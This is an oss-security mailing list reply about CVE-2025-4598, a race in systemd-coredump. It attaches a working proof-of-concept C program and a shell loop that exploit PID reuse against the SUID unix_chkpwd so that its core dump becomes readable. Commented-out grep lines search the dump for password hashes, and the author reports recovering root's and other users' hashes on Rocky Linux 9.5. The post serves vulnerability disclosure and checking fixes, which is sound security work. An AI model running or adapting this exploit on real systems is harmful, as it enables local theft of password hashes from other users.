Received: (qmail 24270 invoked by uid 550); 5 Jun 2025 00:33:49 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 22131 invoked from network); 5 Jun 2025 00:33:15 -0000
Date: Thu, 5 Jun 2025 02:32:36 +0200
From: Solar Designer <solar@openwall.com>
To: David Fernandez Gonzalez <david.fernandez.gonzalez@oracle.com>
Cc: oss-security@lists.openwall.com,
	Qualys Security Advisory <qsa@qualys.com>
Message-ID: <20250605003236.GA24879@openwall.com>
References: <20250529171556.GA9260@localhost.localdomain> <20250603040528.GA12667@openwall.com> <bc24aa82-f5b7-4036-8000-53153dfbcd99@oracle.com>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary="J2SCkAp4GZ/dPZZf"
Content-Disposition: inline
In-Reply-To: <bc24aa82-f5b7-4036-8000-53153dfbcd99@oracle.com>
User-Agent: Mutt/1.4.2.3i
Subject: Re: [oss-security] Local information disclosure in apport and systemd-coredump

--J2SCkAp4GZ/dPZZf
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

On Wed, Jun 04, 2025 at 09:52:43AM +0200, David Fernandez Gonzalez wrote:
> >I think I implemented most of what Qualys described (of the parts
> >relevant to systemd-coredump rather than only to apport), except that I
> >simply use fork() rather than clone() (slower PID reuse) and I didn't
> >implement usage of inotify (harder to win the race leading to password
> >hashes in dump).  I've been testing this after:
> >
> >sysctl kernel.pid_max=2000
> >control unix_chkpwd public # Undo SIG/Security hardening
> >
> >With the PID range reduced from the default of 4M down to 2K, PID reuse
> >is quick even with simple fork().  I am getting frequent unix_chkpwd
> >coredumps (without password hashes in them, which is as expected without
> >inotify), but none of them are getting ACLs set for read by the user
> >(unexpected - I thought I'd win this easier race once in a while), e.g.:
> 
> The POC looks good to me overall but the issue is that the replacement 
> is not really happening while the dump is being generated.
> 
> Since the signal from the SUID process is not handled when it exits, it 
> will remain defunct for too long. Either SIG_IGN or waitpid for the 
> signal right after SIGKILL. Then you need to spawn the extra processes 
> to replace the PID "fast enough". fork is too slow for this I think, you 
> may need to use clone as Qualys mentioned, for me it always works with 
> clone. After that, it should work!

Good point, but this wasn't the issue.  A wait() was reached before the
replacement PID would have been reached by the loop anyway.

Rather, as Qualys pointed out to me off-list, the biggest issue was that
I had the replacement process exit immediately.  I had copy-pasted this
from the first into the second loop and didn't re-think it through.

Simply fixing this (and tuning a few other things while at it) made the
attack work on Rocky Linux 9.5, but I do still have to lower
kernel.pid_max as above (or even lower) to have it succeed quickly.

I've attached the revised files.  As written, the script will stop when
it sees a constant string that's part of unix_chkpwd in the core dump.
I've also tried editing and running it until it finds password hashes,
which it actually did quite a few times as well (that's even without any
inotify magic suggested by Qualys).  Always the user's, but often also
other users' and root's.

Somehow in my testing the core dumps after winning the race only appear
when the target PID is low, in the ~300 to ~425 range.  I tried this on
two different systems (one bare metal and one VM) and observed this same
behavior.  I don't know why.  Also changes to kernel.pid_max and to CPU
affinity didn't affect this lucky range in my experiments.

Anyway, this is good enough now as a non-weaponized PoC to confirm that
the vulnerability is indeed present on RHEL 9.5 rebuilds and to confirm
that its mitigations or fixes make a difference.

Alexander

--J2SCkAp4GZ/dPZZf
Content-Type: text/x-c; charset=us-ascii
Content-Disposition: attachment; filename="CVE-2025-4598.c"

#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv)
{
	char *program = argv[1];
	char argv0[0x20000];

	memset(argv0, 0x7f, sizeof(argv0));
	argv0[sizeof(argv0) - 1] = 0;
	*++argv = argv0;

	srandom(getpid());

	int pid;

retry:
	switch ((pid = fork())) {
	case -1:
		perror("fork");
		return 1;
	case 0:
		execv(program, argv);
		perror("execv");
		return 1;
	}

	usleep(random() % 2000);

	if (kill(pid, SIGSTOP)) {
		perror("kill");
		return 1;
	}

	int newpid, prevpid = 0, wraps = 0;
	while ((newpid = fork()) >= 0) {
		if (!newpid)
			return 0;
		wait(NULL);
		if (newpid < pid - (1 + random() % 10))
			break;
		if (newpid < prevpid)
			if (++wraps > 3)
				break;
		prevpid = newpid;
		if (newpid % 1000 == 0)
			fprintf(stderr, "Target pid %d, current pid %d\n", pid, newpid);
	}

	if (kill(pid, SIGSYS) || kill(pid, SIGCONT)) {
		perror("kill");
		return 1;
	}

	usleep(random() % 2000);

	if (kill(pid, SIGKILL)) {
		perror("kill");
		return 1;
	}

	while ((newpid = fork()) >= 0) {
		if (!newpid) {
			if (getpid() == pid)
				usleep(100000);
			return 0;
		}
		wait(NULL);
		if (newpid >= pid)
			break;
	}

	if (newpid != pid) {
		fprintf(stderr, "Target pid %d, current pid %d - missed target, retrying\n", pid, newpid);
		goto retry;
	}

	fprintf(stderr, "Replaced pid %d\n", pid);
	printf("%d\n", pid);

	return 0;
}

--J2SCkAp4GZ/dPZZf
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="CVE-2025-4598.sh"

#!/bin/sh

gcc CVE-2025-4598.c -o CVE-2025-4598 -Wall

ulimit -c unlimited

while :; do
    pid="$(printf 'whatever\0' | ./CVE-2025-4598 /usr/sbin/unix_chkpwd "$USER" nullok)"
    pidwait -f /usr/lib/systemd/systemd-coredump || sleep 0.1
    #echo $pid
    #ls -l /var/lib/systemd/coredump/
    file=/var/lib/systemd/coredump/*.$pid.*
    getfacl $file || continue
    if coredumpctl -1 dump "$pid" 2>/dev/null | strings -a | grep 'password check failed'; then
    #if coredumpctl -1 dump "$pid" 2>/dev/null | strings -a | grep '\$[0-9A-Za-z]\+\$[0-9A-Za-z./]'; then
    #if zstdcat $file | strings -a | grep '\$[0-9A-Za-z]\+\$[0-9A-Za-z./]'; then
        break
    fi
done

--J2SCkAp4GZ/dPZZf--
